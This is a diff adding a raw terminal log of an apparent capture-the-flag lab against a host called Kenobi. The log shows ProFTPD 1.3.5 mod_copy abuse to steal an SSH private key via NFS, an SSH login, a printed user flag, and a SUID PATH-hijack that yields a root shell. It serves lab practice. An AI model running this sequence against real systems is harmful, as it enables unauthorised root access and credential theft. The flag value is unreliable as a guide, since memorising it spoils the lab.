@@ -1,0 +1,107 @@
+└─$ nc 10.10.105.176 21                                                                    
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.105.176]
+SITE CPFR /home/kenobi/.ssh/id_rsa 
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa 
+250 Copy successful
+
+
+└─$ searchsploit proftpd 1.3.5  
+--------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                         |  Path
+--------------------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                              | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                    | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                                              | linux/remote/36742.txt
+--------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+└─$ sudo mkdir /mnt/kenobiNFS
+└─$ sudo mount 10.10.105.176:/var /mnt/kenobiNFS
+└─$cp /mnt/kenobiNFS/tmp/id_rsa ./ 
+└─$ sudo chmod 600 id_rsa  
+└─$ ssh -i id_rsa kenobi@10.10.105.176
+The authenticity of host '10.10.105.176(10.10.105.176)' can't be established.
+ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.105.176' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ ls
+share  user.txt
+kenobi@kenobi:~$ cat user.txt 
+d0b0f3f53b6caa532a83915e19224899
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null 
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+HTTP/1.1 200 OK
+Date: Fri, 10 Nov 2023 19:24:46 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+kenobi@kenobi:~$ cd /tmp/
+kenobi@kenobi:/tmp$ ls
+systemd-private-b682640f7db240c88cceaea32e2f85d2-systemd-timesyncd.service-GkANYF
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# whoami
+root
+# cd /root
+# ls
+root.txt
